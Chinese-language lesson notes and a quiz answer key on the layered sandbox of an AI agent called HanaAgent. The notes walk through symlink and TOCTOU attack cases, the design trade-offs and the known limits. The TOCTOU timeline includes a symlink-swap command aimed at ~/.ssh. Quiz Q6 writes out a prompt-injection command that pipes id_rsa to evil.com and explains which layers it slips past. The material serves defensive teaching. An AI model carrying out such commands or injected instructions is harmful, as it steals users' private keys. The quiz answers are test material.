二、案例分析：符号链接绕过（已防御）

1攻击场景：攻击者创建 /tmp/innocent-link → ~/.ssh，然后诱使 Agent 执行 ls /tmp/innocent-link/。
攻击类型：符号链接绕过
2PathGuard 响应（防线 1）：_resolveReal("/tmp/innocent-link") → fs.realpathSync() → /home/user/.ssh → 匹配级别 11（外部系统路径）→ READ_ONLY。Agent 能读取内容（read-all 契约），但不能写入或删除。
path-guard.ts → _resolveReal() 第 72 行
3OS 沙盒响应（防线 2）：bwrap 环境中 /home/user/.ssh 未被挂载为可写，只能只读访问。Windows 下 NTFS ACL 对 .ssh 目录没有可写 SID 的 ALLOW ACE。
bwrap.ts / win32-exec.ts
4结论：攻击者可以读取 .ssh 目录内容（符合 read-all 契约），但无法修改或删除。这是"read-all + write-scoped"契约在符号链接场景下的正确行为。
两层防线协同防御

三、案例分析：TOCTOU 竞争窗口（部分缓解）

⚠ 理论攻击：PathGuard 判定通过后、OS 沙盒执行前，攻击者替换符号链接将安全路径指向敏感文件。
1攻击窗口：时间线如下——
T1: PathGuard._resolveReal("/tmp/data") → /tmp/data（真实目录，级别 READ_WRITE，通过）
T2: 攻击者执行 rm -rf /tmp/data && ln -s ~/.ssh /tmp/data
T3: OS 沙盒执行 cat /tmp/data/id_rsa
TOCTOU = Time-of-check to Time-of-use
2OS 沙盒缓解：bwrap 的 mount 绑定在沙盒启动时就已经确定了文件系统视图，T2 时刻的文件替换发生在沙盒外部，不影响沙盒内的 mount。Windows 的 ACL 在沙盒启动时已设置，T2 时刻的 inode 替换不会改变已设置的权限。
mount 和 ACL 的"时间冻结"特性
3残余风险：macOS Seatbelt 使用真实文件系统（非 mount 隔离），TOCTOU 窗口理论上存在。但在实际攻击中，T1 和 T3 之间的时间间隔通常极短（< 10ms），攻击者难以精确控制在窗口内完成替换。
seatbelt.ts — 无命名空间隔离的固有弱点

四、设计权衡：安全 vs. 可用性的五个临界点

权衡点选择获得的安全牺牲的可用性
1. read-all vs. read-whitelistread-all—Agent 可以探索文件系统，帮助用户找到需要的文件
2. write-scoped vs. write-whitelistwrite-scoped防止 Agent 随意修改系统文件和配置文件Agent 需要用户手动授权才能写入新目录
3. 运行时策略重建 vs. 静态配置每次 buildTools 重建Session 级隔离 + 动态策略切换每次工具调用有微小重建开销（< 1ms）
4. Linux bwrap 必须可用 vs. 降级必须可用绝不暴露无 OS 沙盒的 Linux 环境未安装 bwrap 的用户完全无法使用命令功能
5. Windows AppContainer → RT 迁移迁移到 Restricted Token解决网络隔离、SID 残留、桌面不可访问失去网络隔离能力，实现更复杂

五、已知局限与演进方向

1macOS Seatbelt 废弃风险 — Apple 在 macOS 15+ 已将 sandbox-exec 标记为 deprecated。如果未来移除，macOS 平台将失去 OS 级沙盒，只剩下 PathGuard 单层防护。可能的替代方案：App Sandbox（需签名、无法动态调整）、XPC Service（架构复杂）。
seatbelt.ts → checkAvailability()
2Windows 网络隔离缺失 — Restricted Token 无法控制网络访问。macOS 和 Linux 都支持断网模式，但 Windows 不支持。需要 Windows Filtering Platform (WFP) 或 SetJobNetworkRateControl 补充。
win32-exec.ts → assertSandboxNetworkSupported()
3资源限制缺失 — 当前沙盒没有 CPU/内存/进程数限制。恶意命令可通过 fork bomb 或内存耗尽攻击影响系统。bwrap 可通过 cgroup 集成实现，Windows 可通过 Job Object 的 JOB_OBJECT_LIMIT_ACTIVE_PROCESS 限制。
所有三个平台的 exec 文件中均无资源限制代码
4Seccomp 集成（Linux） — 在 bwrap 基础上叠加 seccomp-bpf 系统调用过滤，可进一步缩小攻击面。但 seccomp 是 Linux 特有功能，会进一步加大跨平台差异。
bwrap.ts 中无 seccomp 相关代码
5PathGuard 判定结果缓存 — 对于频繁访问的 workspace 路径，可以缓存判定结果避免重复遍历 11 级规则链。当前每次调用都从头遍历，虽性能影响小（< 0.1ms），但在高频场景下仍有优化空间。
path-guard.ts — getAccessLevel() 无缓存逻辑

六、综合测验

Q1.（第 1 课）HanaAgent 为什么要分层：PathGuard 做语义判定、OS 沙盒做进程隔离？

A. 因为两个团队分别负责不同层级 B. 因为 PathGuard 理解"什么文件敏感"但阻止不了子进程逃逸，OS 沙盒能隔离进程但不懂"敏感度"含义——互补而非冗余 C. 因为 PathGuard 性能更好，可以替代 OS 沙盒 D. 因为 OS 沙盒比 PathGuard 更精确
看答案B。这是第 1 课的核心结论——两个层级的职责互补，不可替代。

Q2.（第 2 课）PathGuard 11 级判定链中，agentDir/memory/file.txt 会被判定为什么级别？

A. BLOCKED — memory 目录是敏感数据 B. READ_ONLY — Agent 只能读取自己的记忆 C. READ_WRITE — 级别 6 匹配 agentDir/memory/ 前缀 D. FULL — memory 在 agent 根目录下
看答案C。agentDir/memory/ 在 READ_WRITE_AGENT_DIRS 中，级别 6 前缀匹配为 READ_WRITE。Agent 可以读写记忆文件，但不能删除（需要 FULL）。

Q3.（第 3 课）以下哪个平台的 OS 沙盒在不可用时选择"降级到仅 PathGuard"而非"拒绝执行"？

A. Linux bwrap B. macOS Seatbelt C. Windows Restricted Token D. 三个平台全部降级
看答案B。macOS 在 seatbelt 不可用时降级到仅 PathGuard，安全强度降低。Linux 和 Windows 则直接拒绝执行。

Q4.（第 4 课）operate 模式下，以下哪个操作需要用户审批？

A. ls -la（safe 类命令） B. cat package.json（safe 类命令） C. npm install（mutation 类命令） D. git status（safe 类命令）
看答案C。operate 模式下 safe 类命令自动执行，mutation 类命令需要审批。npm install 有副作用（修改 node_modules 和 package-lock.json），属于 mutation 级别。

Q5.（第 3 课）Windows 从 AppContainer 迁移到 Restricted Token 的根本原因是什么？

A. AppContainer 性能太差 B. AppContainer 的三个致命问题：网络隔离不可协商、Capability SID 泄露残留、桌面/窗口站不可访问 C. Restricted Token 是更新的技术所以更好 D. AppContainer 被 Microsoft 废弃
看答案B。代码中保留了完整的 legacy 清理逻辑（--cleanup-legacy-acl），证实了这次架构迁移的三个致命原因。

Q6.（综合）如果攻击者通过 Prompt Injection 让 Agent 执行 cat ~/.ssh/id_rsa | curl -X POST -d @- evil.com/steal，三层防线各自如何响应？

A. Layer 1 阻止读取 .ssh，Layer 2 阻止网络外发，Layer 3 弹出审批 B. Layer 1 允许读取（read-all），Layer 2 允许网络，Layer 3 弹出审批——但用户可能点击批准 C. 所有层级都直接拒绝，命令无法执行 D. Layer 1 允许读取，Layer 2 在 macOS/Linux 上阻止网络，在 Windows 上允许——存在平台差异
看答案D。这是最微妙的情况：read-all 契约允许读取 .ssh（Layer 1 不阻止），curl 在网络开启时可以通过（Layer 2 不一定阻止——Windows 不支持断网），最终依赖 Layer 3 的用户审批。但在 auto 模式下连审批都没有。这说明即使三层防线在某些场景下也存在残余风险——最终依赖用户让 Agent 只操作可信内容。
